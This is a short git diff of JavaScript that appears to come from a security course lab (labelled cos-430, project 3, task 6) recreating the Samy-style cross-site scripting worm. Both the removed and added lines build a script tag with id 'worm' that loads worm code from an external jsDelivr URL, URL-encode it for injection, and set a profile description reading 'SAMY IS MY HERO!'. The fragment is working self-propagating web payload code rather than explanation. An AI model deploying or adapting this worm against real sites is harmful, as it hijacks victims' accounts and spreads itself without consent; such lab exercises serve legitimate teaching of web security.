@@ -1,16 +1,9 @@
 window.onload = function(){
-    var headerTag = "<script type=\"text/javascript\" id=\"worm\" ";
-    var src = "src=\"https://cdn.jsdelivr.net/gh/spiny-lumpsucker/";
-        src+= "cos-430@latest/project03_task6_link4.js\">";
-    var tailTag = "</" + "script>";
-
-    var wormCode = encodeURIComponent(headerTag + src + tailTag);
-    
-    // var wormCode = encodeURIComponent(
-    //     "<script type=\"text/javascript\" " +
-    //     "id=\"worm\" " +
-    //     "src=\"https://cdn.jsdelivr.net/gh/spiny-lumpsucker/cos-430@latest/project03_task6_link4.js\">" +
-    //     "</" + "script>");
+    var wormCode = encodeURIComponent(
+        "<script type=\"text/javascript\" " +
+        "id=\"worm\" " +
+        "src=\"https://cdn.jsdelivr.net/gh/spiny-lumpsucker/cos-430@latest/project03_task6_link4.js\">" +
+        "</" + "script>");
 
     // Set the content for the description field
     var desc = "&description=SAMY IS MY HERO!";
